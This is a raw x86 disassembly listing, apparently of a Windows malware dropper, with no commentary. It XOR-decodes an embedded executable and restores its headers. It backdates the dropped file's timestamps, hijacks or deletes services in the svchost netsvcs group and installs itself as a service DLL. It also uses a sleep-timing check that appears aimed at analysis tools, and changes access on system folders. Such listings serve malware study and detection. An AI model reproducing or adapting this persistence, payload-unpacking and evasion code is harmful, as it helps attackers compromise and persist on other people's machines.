call    ds:regopenkeyexa
test    eax, eax
jz      short loc_4021b8
jmp     short def_402094
mov     eax, [ebp+lpvaluename]
push    eax
mov     ecx, [ebp+phkresult]
push    ecx
call    ds:regdeletevaluea
test    eax, eax
jnz     short def_402094
mov     [ebp+var_1c], 1
mov     [ebp+ms_exc.registration.trylevel], 0ffffffffh
call    loc_4021df
jmp     short loc_4021f4
mov     edx, [ebp+hkey]
push    edx
call    ds:regclosekey
mov     eax, [ebp+phkresult]
push    eax
call    ds:regclosekey
retn
mov     eax, [ebp+var_1c]
mov     ecx, [ebp+ms_exc.registration.next]
mov     large fs:0, ecx
pop     edi
pop     esi
pop     ebx
mov     esp, ebp
pop     ebp
retn
push    ebp
mov     ebp, esp
pop     ebp
retn
push    ebp
mov     ebp, esp
mov     eax, [ebp+exceptioninfo]
push    eax
call    sub_402220
add     esp, 4
push    0
call    ds:exitprocess
pop     ebp
retn    4
push    ebp
mov     ebp, esp
push    ecx
mov     eax, [ebp+size]
push    eax
push    0
mov     ecx, [ebp+lpbuffer]
push    ecx
call    memset
add     esp, 0ch
mov     edx, [ebp+lpbuffer]
push    edx
mov     eax, [ebp+size]
push    eax
call    ds:gettemppatha
mov     [ebp+var_4], eax
cmp     [ebp+var_4], 2
jnb     short loc_4022e9
mov     ecx, [ebp+size]
push    ecx
mov     edx, [ebp+lpbuffer]
push    edx
call    ds:getwindowsdirectorya
push    offset atemp
mov     eax, [ebp+lpbuffer]
push    eax
call    ds:lstrcata
mov     ecx, [ebp+lpbuffer]
push    ecx
call    sub_4014a0
add     esp, 4
and     eax, 0ffh
and     eax, eax
jnz     short loc_4022be
push    offset actemp
mov     edx, [ebp+lpbuffer]
push    edx
call    ds:lstrcpya
mov     eax, [ebp+lpbuffer]
push    eax
push    offset name
call    ds:setenvironmentvariablea
mov     ecx, [ebp+lpbuffer]
push    ecx
push    offset atemp_0
call    ds:setenvironmentvariablea
mov     edx, [ebp+lpbuffer]
push    edx
call    ds:lstrlena
mov     [ebp+var_4], eax
mov     eax, [ebp+lpbuffer]
push    eax
call    sub_4014a0
add     esp, 4
and     eax, 0ffh
test    eax, eax
jnz     short loc_40230a
push    0
mov     ecx, [ebp+lpbuffer]
push    ecx
call    ds:createdirectorya
mov     eax, [ebp+var_4]
mov     esp, ebp
pop     ebp
retn
push    ebp
mov     ebp, esp
sub     esp, 340h
push    edi
mov     eax, src
add     eax, 600h
mov     [ebp+lpbuffer], eax
mov     [ebp+var_210], 0
mov     ecx, 40h
xor     eax, eax
lea     edi, [ebp+var_20f]
rep stosd
stosw
stosb
lea     ecx, [ebp+var_330]
push    ecx
push    104h
call    sub_402250
add     esp, 8
call    ds:gettickcount
push    eax
lea     edx, [ebp+var_330]
push    edx
push    offset asdgho
lea     eax, [ebp+filename]
push    eax
call    ds:wsprintfa
add     esp, 10h
push    0
push    80h
push    2
push    0
push    2
push    40000000h
lea     ecx, [ebp+filename]
push    ecx
call    ds:createfilea
mov     [ebp+hfile], eax
cmp     [ebp+hfile], 0
jnz     short loc_4023bf
xor     eax, eax
jmp     loc_402544
mov     [ebp+buffer], 5a4dh
mov     [ebp+var_214], 4550h
push    0
lea     edx, [ebp+numberofbyteswritten]
push    edx
mov     eax, src
mov     ecx, [eax+5fch]
push    ecx
mov     edx, [ebp+lpbuffer]
push    edx
mov     eax, [ebp+hfile]
push    eax
call    ds:writefile
push    0
push    0
push    0
mov     ecx, [ebp+hfile]
push    ecx
call    ds:setfilepointer
push    0
lea     edx, [ebp+numberofbyteswritten]
push    edx
push    2
lea     eax, [ebp+buffer]
push    eax
mov     ecx, [ebp+hfile]
push    ecx
call    ds:writefile
push    0
push    0
mov     edx, [ebp+lpbuffer]
mov     eax, [edx+3ch]
push    eax
mov     ecx, [ebp+hfile]
push    ecx
call    ds:setfilepointer
push    0
lea     edx, [ebp+numberofbyteswritten]
push    edx
push    4
lea     eax, [ebp+var_214]
push    eax
mov     ecx, [ebp+hfile]
push    ecx
call    ds:writefile
push    10h
push    0
lea     edx, [ebp+systemtime]
push    edx
call    memset
add     esp, 0ch
mov     [ebp+systemtime.wyear], 7d5h
mov     [ebp+systemtime.wmonth], 7
mov     [ebp+systemtime.wday], 10h
mov     [ebp+systemtime.whour], 14h
mov     [ebp+systemtime.wminute], 0
lea     eax, [ebp+filetime]
push    eax
lea     ecx, [ebp+systemtime]
push    ecx
call    ds:systemtimetofiletime
lea     edx, [ebp+creationtime]
push    edx
lea     eax, [ebp+filetime]
push    eax
call    ds:localfiletimetofiletime
lea     ecx, [ebp+creationtime]
push    ecx
push    0
lea     edx, [ebp+creationtime]
push    edx
mov     eax, [ebp+hfile]
push    eax
call    ds:setfiletime
mov     ecx, [ebp+hfile]
push    ecx
call    ds:closehandle
mov     edx, [ebp+arg_0]
movsx   eax, byte ptr [edx]
test    eax, eax
jnz     short loc_40251f
lea     ecx, [ebp+filename]
push    ecx
push    offset as_0
mov     edx, [ebp+arg_0]
push    edx
call    ds:wsprintfa
add     esp, 0ch
jmp     short loc_40253f
mov     eax, [ebp+arg_0]
push    eax
lea     ecx, [ebp+filename]
push    ecx
call    ds:movefilea
lea     edx, [ebp+filename]
push    edx
call    sub_401000
add     esp, 4
mov     eax, 1
pop     edi
mov     esp, ebp
pop     ebp
retn
push    ebp
mov     ebp, esp
sub     esp, 830h
mov     [ebp+lpstring1], 0
mov     [ebp+var_c], 0
lea     eax, [ebp+phkresult]
push    eax
push    0f003fh
push    0
mov     ecx, lpsubkey
push    ecx
push    80000002h
call    ds:regopenkeyexa
mov     [ebp+var_c], eax
cmp     [ebp+var_c], 0
jz      short loc_402597
xor     eax, eax
jmp     loc_402749
mov     [ebp+cbdata], 800h
lea     edx, [ebp+cbdata]
push    edx
lea     eax, [ebp+data]
push    eax
lea     ecx, [ebp+type]
push    ecx
push    0
push    offset valuename
mov     edx, [ebp+phkresult]
push    edx
call    ds:regqueryvalueexa
mov     [ebp+var_c], eax
cmp     [ebp+var_c], 0
jz      short loc_4025d1
mov     eax, [ebp+phkresult]
push    eax
call    ds:regclosekey
mov     [ebp+var_81c], 0
mov     byte ptr [ebp+var_818], 0
mov     [ebp+string2], 0
xor     ecx, ecx
mov     [ebp+var_82b], ecx
mov     [ebp+var_827], ecx
mov     [ebp+var_823], cl
push    6
lea     edx, [ebp+string2]
push    edx
call    sub_401140
add     esp, 8
lea     eax, [ebp+data]
mov     [ebp+str], eax
jmp     short loc_40262d
push    0
mov     ecx, [ebp+str]
push    ecx
call    strchr
add     esp, 8
add     eax, 1
mov     [ebp+str], eax
mov     edx, [ebp+str]
movsx   eax, byte ptr [edx]
test    eax, eax
jz      short loc_402657
lea     ecx, [ebp+string2]
push    ecx
mov     edx, [ebp+str]
push    edx
call    ds:lstrcmpia
test    eax, eax
jnz     short loc_402655
mov     byte ptr [ebp+var_818], 1
jmp     short loc_402657
jmp     short loc_402619
mov     eax, [ebp+var_818]
and     eax, 0ffh
test    eax, eax
jnz     short loc_402668
jmp     short loc_402678
mov     byte ptr [ebp+var_818], 0
mov     ecx, 1
test    ecx, ecx
jnz     short loc_4025fd
lea     edx, [ebp+string2]
push    edx
call    ds:lstrlena
mov     byte ptr [ebp+eax+var_82b], 0
lea     eax, [ebp+string2]
push    eax
call    ds:lstrlena
add     eax, 2
push    eax
lea     ecx, [ebp+string2]
push    ecx
mov     edx, [ebp+cbdata]
lea     eax, [ebp+edx+var_818+3]
push    eax
call    memcpy
add     esp, 0ch
lea     ecx, [ebp+string2]
push    ecx
call    ds:lstrlena
mov     edx, [ebp+cbdata]
lea     eax, [edx+eax+1]
push    eax
lea     ecx, [ebp+data]
push    ecx
push    7
push    0
push    offset anetsvcs_0
mov     edx, [ebp+phkresult]
push    edx
call    ds:regsetvalueexa
mov     [ebp+var_c], eax
mov     eax, [ebp+phkresult]
push    eax
call    ds:regclosekey
mov     ecx, [ebp+var_818]
and     ecx, 0ffh
test    ecx, ecx
jnz     short loc_402743
lea     edx, [ebp+string2]
push    edx
call    ds:lstrlena
add     eax, 1
push    eax
call    ??2@yapaxi@z
add     esp, 4
mov     [ebp+var_830], eax
mov     eax, [ebp+var_830]
mov     [ebp+lpstring1], eax
lea     ecx, [ebp+string2]
push    ecx
mov     edx, [ebp+lpstring1]
push    edx
call    ds:lstrcpya
mov     eax, [ebp+lpstring1]
mov     esp, ebp
pop     ebp
retn
push    ebp
mov     ebp, esp
sub     esp, 50ch
push    0f003fh
push    0
push    0
call    ds:openscmanagera
mov     [ebp+hscmanager], eax
push    0
push    0
push    0
push    0
push    0
push    offset binarypathname
push    0
push    2
mov     eax, [ebp+dwservicetype]
push    eax
push    0f01ffh
mov     ecx, [ebp+lpdisplayname]
push    ecx
mov     edx, [ebp+lpservicename]
push    edx
mov     eax, [ebp+hscmanager]
push    eax
call    ds:createservicea
mov     [ebp+hservice], eax
cmp     [ebp+hservice], 0
jz      loc_402921
mov     ecx, [ebp+lpservicename]
push    ecx
push    offset asystemcurrentc
lea     edx, [ebp+string1]
push    edx
call    ds:wsprintfa
add     esp, 0ch
push    0
mov     eax, [ebp+lpstring]
push    eax
call    ds:lstrlena
push    eax
mov     ecx, [ebp+lpstring]
push    ecx
push    1
push    offset adescription
lea     edx, [ebp+string1]
push    edx
push    80000002h
call    sub_402050
add     esp, 1ch
cmp     [ebp+arg_18], 0
jz      short loc_402827
mov     eax, [ebp+arg_18]
movsx   ecx, byte ptr [eax]
and     ecx, ecx
jz      short loc_402827
push    1
mov     edx, [ebp+arg_18]
push    edx
call    ds:lstrlena
push    eax
mov     eax, [ebp+arg_18]
push    eax
push    1
push    offset aupdatecrc
lea     ecx, [ebp+string1]
push    ecx
push    80000002h
call    sub_402050
add     esp, 1ch
push    104h
push    0
lea     edx, [ebp+filename]
push    edx
call    memset
add     esp, 0ch
cmp     hmodule, 0
jnz     short loc_402853
push    0
call    ds:getmodulehandlea
mov     hmodule, eax
push    104h
lea     eax, [ebp+filename]
push    eax
mov     ecx, hmodule
push    ecx
call    ds:getmodulefilenamea
push    0
lea     edx, [ebp+filename]
push    edx
call    ds:lstrlena
push    eax
lea     eax, [ebp+filename]
push    eax
push    1
push    offset amodule
lea     ecx, [ebp+string1]
push    ecx
push    80000002h
call    sub_402050
add     esp, 1ch
push    offset aparameters
lea     edx, [ebp+string1]
push    edx
call    ds:lstrcata
push    0
mov     eax, [ebp+arg_c]
push    eax
call    ds:lstrlena
push    eax
mov     ecx, [ebp+arg_c]
push    ecx
push    2
push    offset aservicedll
lea     edx, [ebp+string1]
push    edx
push    80000002h
call    sub_402050
add     esp, 1ch
push    1
push    0
push    offset str
push    1
push    offset aservicemain
lea     eax, [ebp+string1]
push    eax
push    80000002h
call    sub_402050
add     esp, 1ch
mov     ecx, [ebp+arg_c]
push    ecx
call    sub_402320
add     esp, 4
and     eax, eax
jnz     short loc_402921
mov     edx, [ebp+hservice]
push    edx
call    ds:deleteservice
mov     [ebp+hservice], 0
mov     eax, [ebp+hscmanager]
push    eax
call    ds:closeservicehandle
mov     eax, [ebp+hservice]
mov     esp, ebp
pop     ebp
retn
push    ebp
mov     ebp, esp
sub     esp, 10h
mov     [ebp+size], 17ch
mov     eax, [ebp+size]
push    eax
call    ??2@yapaxi@z
add     esp, 4
mov     [ebp+var_c], eax
mov     ecx, [ebp+var_c]
mov     [ebp+var_4], ecx
mov     edx, [ebp+size]
push    edx
push    0
mov     eax, [ebp+var_4]
push    eax
call    memset
add     esp, 0ch
push    118h
push    offset dword_42d158
mov     ecx, [ebp+var_4]
push    ecx
call    memcpy
add     esp, 0ch
push    offset byte_42d50e
mov     edx, [ebp+var_4]
add     edx, 118h
push    edx
call    strcpy
add     esp, 8
push    0
mov     eax, [ebp+size]
push    eax
mov     ecx, [ebp+var_4]
push    ecx
call    sub_401230
add     esp, 0ch
push    eax
push    offset aglobalkixll
mov     edx, [ebp+arg_0]
push    edx
call    ds:wsprintfa
add     esp, 0ch
mov     eax, [ebp+var_4]
mov     [ebp+var_10], eax
mov     ecx, [ebp+var_10]
push    ecx
call    ??3@yaxpax@z
add     esp, 4
mov     esp, ebp
pop     ebp
retn
push    ebp
mov     ebp, esp
sub     esp, 84h
push    edi
mov     [ebp+var_28], 0
mov     ecx, 7
or      eax, eax
lea     esi, [ecx+ebx*8-0dh]
stosd
stosb
mov     [ebp+name], 0
mov     ecx, 0ch
xor     eax, eax
lea     edi, [ebp+var_67]
rep stosd
stosb
mov     byte ptr [ebp+var_4], 0
push    0ah
lea     eax, [ebp+var_28]
push    eax
call    sub_401140
add     esp, 8
mov     [ebp+serviceargvectors], 0
xor     ecx, ecx
mov     [ebp+var_30], ecx
mov     [ebp+var_2c], ecx
lea     edx, [ebp+var_28]
mov     [ebp+serviceargvectors], edx
mov     [ebp+var_30], offset destination
lea     eax, [ebp+var_28]
push    eax
push    offset aglobalkisll
lea     ecx, [ebp+name]
push    ecx
call    ds:wsprintfa
add     esp, 0ch
lea     edx, [ebp+name]
push    edx
push    0
push    1
push    0
call    ds:createeventa
mov     [ebp+hhandle], eax
lea     eax, [ebp+serviceargvectors]
push    eax
push    2
mov     ecx, [ebp+hservice]
push    ecx
call    ds:startservicea
test    eax, eax
jz      short loc_402a94
push    3a98h
mov     edx, [ebp+hhandle]
push    edx
call    ds:waitforsingleobject
test    eax, eax
jz      short loc_402a90
cmp     [ebp+hhandle], 0
jnz     short loc_402a94
mov     byte ptr [ebp+var_4], 1
mov     eax, [ebp+var_4]
and     eax, 0ffh
test    eax, eax
jnz     short loc_402ace
lea     ecx, [ebp+servicestatus]
push    ecx
push    1
mov     edx, [ebp+hservice]
push    edx
call    ds:controlservice
cmp     [ebp+servicestatus.dwcurrentstate], 1
jz      short loc_402ac4
push    7d0h
call    ds:sleep
mov     eax, [ebp+hservice]
push    eax
call    ds:deleteservice
mov     ecx, [ebp+hhandle]
push    ecx
call    ds:closehandle
mov     al, byte ptr [ebp+var_4]
pop     edi
mov     esp, ebp
pop     ebp
retn
push    ebp
mov     ebp, esp
push    0ffffffffh
push    offset sub_403800
mov     eax, large fs:0
push    eax
mov     large fs:0, esp
push    ecx
sub     esp, 91ch
push    ebx
push    esi
push    edi
mov     [ebp-10h], esp
mov     dword ptr [ebp-28h], 0
mov     dword ptr [ebp-14h], 0
mov     dword ptr [ebp-20h], 80000002h
mov     dword ptr [ebp-1ch], 0
mov     dword ptr [ebp-234h], 0
mov     dword ptr [ebp-18h], 0
mov     dword ptr [ebp-24h], 0
mov     dword ptr [ebp-4], 0
lea     eax, [ebp-20h]
push    eax
push    1
push    0
mov     ecx, lpsubkey
push    ecx
mov     edx, [ebp-20h]
push    edx
call    ds:regopenkeyexa
mov     [ebp-14h], eax
cmp     dword ptr [ebp-14h], 0
jz      short loc_402b7d
mov     dword ptr [ebp-904h], offset aregopenkeyex
push    offset __ti2pad
lea     eax, [ebp-904h]
push    eax
call    _cxxthrowexception
mov     dword ptr [ebp-23ch], 400h
lea     ecx, [ebp-23ch]
push    ecx
lea     edx, [ebp-640h]
push    edx
lea     eax, [ebp-6a8h]
push    eax
push    0
push    offset anetsvcs_1
mov     ecx, [ebp-20h]
push    ecx
call    ds:regqueryvalueexa
mov     [ebp-14h], eax
mov     edx, [ebp-20h]
push    edx
call    ds:regclosekey
cmp     dword ptr [ebp-14h], 0
jz      short loc_402bdb
mov     dword ptr [ebp-908h], offset aregqueryvaluee
push    offset __ti2pad
lea     eax, [ebp-908h]
push    eax
call    _cxxthrowexception
push    0f003fh
push    0
push    0
call    ds:openscmanagera
mov     [ebp-234h], eax
cmp     dword ptr [ebp-234h], 0
jnz     short loc_402c14
mov     dword ptr [ebp-90ch], offset aopenscmanager
push    offset __ti2pad
lea     ecx, [ebp-90ch]
push    ecx
call    _cxxthrowexception
mov     dword ptr [ebp-8a0h], offset asystemrootsyst_0
mov     byte ptr [ebp-8f8h], 0
mov     ecx, 13h
xor     eax, eax
lea     edi, [ebp-8f7h]
rep stosd
stosw
stosb
mov     byte ptr [ebp-6a4h], 0
mov     ecx, 18h
xor     eax, eax
lea     edi, [ebp-6a3h]
rep stosd
stosw
stosb
mov     edx, [ebp+8]
push    edx
lea     eax, [ebp-6a4h]
push    eax
call    strcpy
add     esp, 8
movsx   ecx, byte ptr [ebp-6a4h]
test    ecx, ecx
jz      short near ptr loc_402c94+2
push    offset dword_42cc24
lea     edx, [ebp-6a4h]
push    edx
call    strcmp
add     esp, 8
test    eax, eax
jnz     short loc_402c97
push    7
lea     eax, [ebp-6a4h]
push    eax
call    sub_401140
add     esp, 8
xor     ecx, ecx
mov     cl, byte_42d740
test    ecx, ecx
jnz     short loc_402cce
lea     edx, [ebp-8f8h]
push    edx
call    sub_402940
add     esp, 4
lea     eax, [ebp-8f8h]
push    eax
push    0
push    1
call    ds:openeventa
test    eax, eax
jz      short loc_402cce
xor     eax, eax
jmp     loc_403102
mov     dword ptr [ebp-8fch], 50h
lea     ecx, [ebp-8fch]
push    ecx
lea     edx, [ebp-8f8h]
push    edx
lea     eax, [ebp-6a4h]
push    eax
mov     ecx, [ebp-234h]
push    ecx
call    ds:getservicekeynamea
test    eax, eax
jz      short loc_402d1c
push    offset dword_42cc30
lea     edx, [ebp-6a4h]
push    edx
call    ds:lstrcata
mov     dword ptr [ebp-8fch], 50h
jmp     short loc_402cd8
push    104h
lea     eax, [ebp-230h]
push    eax
call    ds:getsystemdirectorya
mov     byte ptr [ebp-8a8h], 0
xor     ecx, ecx
mov     [ebp-8a7h], ecx
mov     byte ptr [ebp-89ch], 0
mov     ecx, 7ch
xor     eax, eax
lea     edi, [ebp-89bh]
rep stosd
stosw
stosb
lea     edx, [ebp-640h]
mov     [ebp-240h], edx
jmp     short loc_402d81
mov     eax, [ebp-240h]
push    eax
call    ds:lstrlena
mov     ecx, [ebp-240h]
lea     edx, [ecx+eax+1]
mov     [ebp-240h], edx
mov     eax, [ebp-240h]
movsx   ecx, byte ptr [eax]
test    ecx, ecx
jz      loc_402fee
mov     edx, [ebp-240h]
movsx   eax, byte ptr [edx+1]
test    eax, eax
jnz     short loc_402da5
jmp     loc_402fee
push    offset aiprip
mov     ecx, [ebp-240h]
push    ecx
call    _stricmp
add     esp, 8
test    eax, eax
jz      short loc_402dd5
push    offset anwsapagent
mov     edx, [ebp-240h]
push    edx
call    _stricmp
add     esp, 8
test    eax, eax
jnz     short loc_402dd7
jmp     short loc_402d64
push    offset aserviceone
mov     eax, [ebp-240h]
push    eax
call    _stricmp
add     esp, 8
test    eax, eax
jz      short loc_402e07
push    offset aservicetwo
mov     ecx, [ebp-240h]
push    ecx
call    _stricmp
add     esp, 8
test    eax, eax
jnz     short loc_402e0c
jmp     loc_402d64
mov     edx, [ebp-240h]
push    edx
call    _strlwr
add     esp, 4
push    eax
push    offset asystemcurrentc_0
lea     eax, [ebp-89ch]
push    eax
call    ds:wsprintfa
add     esp, 0ch
push    0
push    0
push    0
lea     ecx, [ebp-7d4h]
push    ecx
push    2
push    offset aimagepath
lea     edx, [ebp-89ch]
push    edx
push    80000002h
call    sub_401ac0
add     esp, 20h
mov     [ebp-918h], eax
mov     eax, [ebp-918h]
mov     [ebp-14h], eax
cmp     dword ptr [ebp-14h], 1
jnz     short loc_402e73
jmp     loc_402d64
lea     ecx, [ebp-89ch]
push    ecx
push    80000002h
call    ds:shdeletekeya
mov     edx, [ebp-240h]
push    edx
lea     eax, [ebp-230h]
push    eax
push    offset asntsdll
lea     ecx, [ebp-12ch]
push    ecx
call    ds:wsprintfa
add     esp, 10h
lea     edx, [ebp-12ch]
push    edx
call    sub_401000
add     esp, 4
lea     eax, [ebp-12ch]
push    eax
call    ds:getfileattributesa
cmp     eax, 0ffffffffh
jz      short loc_402ece
jmp     loc_402d64
mov     ecx, [ebp-240h]
push    ecx
lea     edx, [ebp-89ch]
push    edx
call    ds:lstrcpya
push    offset adel
lea     eax, [ebp-89ch]
push    eax
call    sub_401410
add     esp, 8
lea     ecx, [ebp-89ch]
push    ecx
call    sub_401000
add     esp, 4
lea     edx, [ebp-89ch]
push    edx
call    ds:getfileattributesa
cmp     eax, 0ffffffffh
jz      short loc_402f1c
jmp     loc_402d64
push    0
push    120h
push    offset afreetest_0
lea     eax, [ebp-12ch]
push    eax
mov     ecx, [ebp+0ch]
push    ecx
lea     edx, [ebp-6a4h]
push    edx
mov     eax, [ebp-240h]
push    eax
call    sub_402750
add     esp, 1ch
mov     [ebp-91ch], eax
mov     ecx, [ebp-91ch]
mov     [ebp-18h], ecx
cmp     dword ptr [ebp-18h], 0
jz      loc_402fe9
mov     edx, [ebp-18h]
push    edx
call    sub_4029e0
add     esp, 4
mov     [ebp-920h], al
mov     eax, [ebp-920h]
and     eax, 0ffh
test    eax, eax
jz      short loc_402fd0
mov     ecx, [ebp-240h]
push    ecx
call    ds:lstrlena
add     eax, 1
push    eax
call    ??2@yapaxi@z
add     esp, 4
mov     [ebp-924h], eax
mov     edx, [ebp-924h]
mov     [ebp-910h], edx
mov     eax, [ebp-910h]
mov     [ebp-28h], eax
mov     ecx, [ebp-240h]
push    ecx
mov     edx, [ebp-28h]
push    edx
call    ds:lstrcpya
mov     eax, [ebp-28h]
jmp     loc_403102
lea     eax, [ebp-12ch]
push    eax
call    sub_401000
add     esp, 4
mov     ecx, [ebp-18h]
push    ecx
call    ds:closeservicehandle
jmp     loc_402d64
call    sub_402550
mov     [ebp-928h], eax
mov     edx, [ebp-928h]
mov     [ebp-28h], edx
mov     eax, [ebp-28h]
mov     [ebp-240h], eax
lea     ecx, [ebp-12ch]
push    ecx
call    ds:getfileattributesa
cmp     eax, 0ffffffffh
jz      short loc_403031
push    offset asc_42ccb4
lea     edx, [ebp-12ch]
push    edx
call    ds:lstrcata
jmp     short loc_40300b
push    0
push    110h
push    offset afreetest_1
lea     eax, [ebp-12ch]
push    eax
mov     ecx, [ebp+0ch]
push    ecx
lea     edx, [ebp-6a4h]
push    edx
mov     eax, [ebp-240h]
push    eax
call    sub_402750
add     esp, 1ch
mov     [ebp-92ch], eax
mov     ecx, [ebp-92ch]
mov     [ebp-18h], ecx
cmp     dword ptr [ebp-18h], 0
jnz     short loc_40308e
mov     dword ptr [ebp-914h], offset acreateservicep
push    offset __ti2pad
lea     edx, [ebp-914h]
push    edx
call    _cxxthrowexception
jmp     short loc_4030b5
cmp     dword ptr [ebp-900h], 0
jz      short loc_4030af
mov     eax, [ebp-900h]
movsx   ecx, byte ptr [eax]
test    ecx, ecx
jz      short loc_4030af
call    ds:getlasterror
mov     [ebp-14h], eax
mov     eax, offset loc_4030b5
retn
mov     dword ptr [ebp-4], 0ffffffffh
mov     edx, [ebp-20h]
push    edx
call    ds:regclosekey
mov     eax, [ebp-1ch]
push    eax
call    ds:regclosekey
cmp     dword ptr [ebp-18h], 0
jz      short loc_4030f3
push    0
push    0
mov     ecx, [ebp-18h]
push    ecx
call    ds:startservicea
mov     edx, [ebp-18h]
push    edx
call    ds:closeservicehandle
mov     eax, [ebp-28h]
jmp     short loc_403102
mov     eax, [ebp-234h]
push    eax
call    ds:closeservicehandle
xor     eax, eax
mov     ecx, [ebp-0ch]
mov     large fs:0, ecx
pop     edi
pop     esi
pop     ebx
mov     esp, ebp
pop     ebp
retn
push    ebp
mov     ebp, esp
sub     esp, 0ch
mov     eax, src
mov     [ebp+var_c], eax
mov     ecx, src
mov     dl, [ecx+0fh]
mov     byte ptr [ebp+var_4], dl
mov     [ebp+var_8], 0
jmp     short loc_40314c
mov     eax, [ebp+var_8]
add     eax, 1
mov     [ebp+var_8], eax
cmp     [ebp+var_8], 5f8h
jnb     short loc_403176
mov     ecx, [ebp+var_c]
xor     edx, edx
mov     dl, [ecx]
mov     eax, [ebp+var_4]
and     eax, 0ffh
xor     edx, eax
mov     ecx, [ebp+var_c]
mov     [ecx], dl
mov     edx, [ebp+var_c]
add     edx, 1
mov     [ebp+var_c], edx
jmp     short loc_403143
mov     eax, src
mov     cl, [eax+5f8h]
mov     byte ptr [ebp+var_4], cl
mov     edx, src
add     edx, 600h
mov     [ebp+var_c], edx
mov     [ebp+var_8], 0
jmp     short loc_4031a5
mov     eax, [ebp+var_8]
add     eax, 1
mov     [ebp+var_8], eax
mov     ecx, src
mov     edx, [ebp+var_8]
cmp     edx, [ecx+5fch]
jnb     short loc_4031d8
mov     eax, [ebp+var_c]
xor     ecx, ecx
mov     cl, [eax]
mov     edx, [ebp+var_4]
and     edx, 0ffh
xor     ecx, edx
mov     eax, [ebp+var_c]
mov     [eax], cl
mov     ecx, [ebp+var_c]
add     ecx, 1
mov     [ebp+var_c], ecx
jmp     short loc_40319c
push    5f8h
mov     edx, src
push    edx
mov     eax, [ebp+arg_0]
push    eax
call    memcpy
add     esp, 0ch
mov     esp, ebp
pop     ebp
retn
push    ebp
mov     ebp, esp
sub     esp, 118h
push    edi
mov     [ebp+var_114], 0
mov     [ebp+substr], offset dword_42cce0
mov     [ebp+string1], 0
mov     ecx, 40h
xor     eax, eax
lea     edi, [ebp+var_10f]
rep stosd
stosw
stosb
push    offset dword_42d148
call    sub_403120
add     esp, 4
mov     eax, [ebp+substr]
push    eax
call    ds:getcommandlinea
push    eax
call    strstr
add     esp, 8
mov     [ebp+substr], eax
cmp     [ebp+substr], 0
jz      short loc_403296
mov     byte_42d740, 1
push    offset substr
mov     ecx, [ebp+substr]
push    ecx
call    strstr
add     esp, 8
mov     [ebp+substr], eax
cmp     [ebp+substr], 0
jz      short loc_403294
push    0fh
mov     edx, [ebp+substr]
add     edx, 1
push    edx
push    offset destination
call    strncpy
add     esp, 0ch
jmp     short loc_4032e0
lea     eax, [ebp+string1]
push    eax
call    sub_401030
add     esp, 4
test    eax, eax
jz      short loc_4032e0
push    offset aexplorerexe
lea     ecx, [ebp+string1]
push    ecx
call    _stricmp
add     esp, 8
test    eax, eax
jz      short loc_4032d9
push    offset acmdexe
lea     edx, [ebp+string1]
push    edx
call    _stricmp
add     esp, 8
test    eax, eax
jnz     short loc_4032e0
mov     byte_42d740, 1
call    ds:gettickcount
mov     [ebp+var_4], eax
push    7d0h
call    ds:sleep
call    ds:gettickcount
mov     [ebp+var_c], eax
push    offset toplevelexceptionfilter
call    ds:setunhandledexceptionfilter
mov     eax, [ebp+var_c]
sub     eax, [ebp+var_4]
cmp     eax, 3e8h
jb      short loc_40333e
xor     ecx, ecx
mov     cl, byte_42d676
test    ecx, ecx
jl      short loc_40333e
call    sub_403380
push    offset word_42d572
push    offset byte_42d50e
call    loc_402ae0
add     esp, 8
mov     [ebp+var_114], eax
cmp     [ebp+var_114], 0
jz      short loc_403362
mov     edx, [ebp+var_114]
mov     [ebp+var_118], edx
mov     eax, [ebp+var_118]
push    eax
call    ??3@yaxpax@z
add     esp, 4
push    0
call    ds:exitprocess
pop     edi
mov     esp, ebp
pop     ebp
retn    10h
push    ebp
mov     ebp, esp
sub     esp, 384h
mov     [ebp+pcbbuffer], 32h
mov     [ebp+bufptr], 0
mov     [ebp+entriesread], 0
mov     [ebp+totalentries], 0
push    32h
push    0
lea     eax, [ebp+multibytestr]
push    eax
call    memset
add     esp, 0ch
push    104h
push    0
lea     ecx, [ebp+string1]
push    ecx
call    memset
add     esp, 0ch
push    104h
push    0
lea     edx, [ebp+buffer]
push    edx
call    memset
add     esp, 0ch
push    104h
lea     eax, [ebp+buffer]
push    eax
call    ds:getsystemdirectorya
push    104h
lea     ecx, [ebp+string1]
push    ecx
call    ds:getsystemdirectorya
push    offset adrivers
lea     edx, [ebp+string1]
push    edx
call    ds:lstrcata
lea     eax, [ebp+pcbbuffer]
push    eax
lea     ecx, [ebp+multibytestr]
push    ecx
call    ds:getusernamea
push    10000000h
lea     edx, [ebp+multibytestr]
push    edx
lea     eax, [ebp+buffer]
push    eax
call    sub_4014c0
add     esp, 0ch
push    10000000h
lea     ecx, [ebp+multibytestr]
push    ecx
lea     edx, [ebp+string1]
push    edx
call    sub_4014c0
add     esp, 0ch
push    64h
lea     eax, [ebp+widecharstr]
push    eax
push    0ffffffffh
lea     ecx, [ebp+multibytestr]
push    ecx
push    0
push    0
call    ds:multibytetowidechar
lea     edx, [ebp+totalentries]
push    edx
lea     eax, [ebp+entriesread]
push    eax
push    0ffffffffh
lea     ecx, [ebp+bufptr]
push    ecx
push    1
push    0
lea     edx, [ebp+widecharstr]
push    edx
push    0
call    netusergetlocalgroups
mov     [ebp+var_2e0], eax
cmp     [ebp+var_2e0], 0
jnz     loc_40357b
mov     eax, [ebp+bufptr]
mov     [ebp+var_380], eax
cmp     [ebp+var_380], 0
jz      loc_40357b
mov     [ebp+var_384], 0
jmp     short loc_4034f6
mov     ecx, [ebp+var_384]
add     ecx, 1
mov     [ebp+var_384], ecx
mov     edx, [ebp+var_384]
cmp     edx, [ebp+entriesread]
jnb     short loc_40357b
cmp     [ebp+var_380], 0
jnz     short loc_40350f
jmp     short loc_40357b
push    0
push    0
push    64h
lea     eax, [ebp+accountname]
push    eax
push    0ffffffffh
mov     ecx, [ebp+var_380]
mov     edx, [ecx]
push    edx
push    0
push    1
call    ds:widechartomultibyte
push    10000000h
lea     eax, [ebp+accountname]
push    eax
lea     ecx, [ebp+buffer]
push    ecx
call    sub_4014c0
add     esp, 0ch
push    10000000h
lea     edx, [ebp+accountname]
push    edx
lea     eax, [ebp+string1]
push    eax
call    sub_4014c0
add     esp, 0ch
mov     ecx, [ebp+var_380]
add     ecx, 4
mov     [ebp+var_380], ecx
jmp     loc_4034e7
cmp     [ebp+bufptr], 0
jz      short loc_403590
mov     edx, [ebp+bufptr]
push    edx
call    netapibufferfree
mov     esp, ebp
pop     ebp
retn
push    ebp
mov     ebp, esp
push    0ffffffffh
push    offset dword_404228
push    offset _except_handler3
mov     eax, large fs:0
push    eax
mov     large fs:0, esp
sub     esp, 68h
push    ebx
push    esi
push    edi
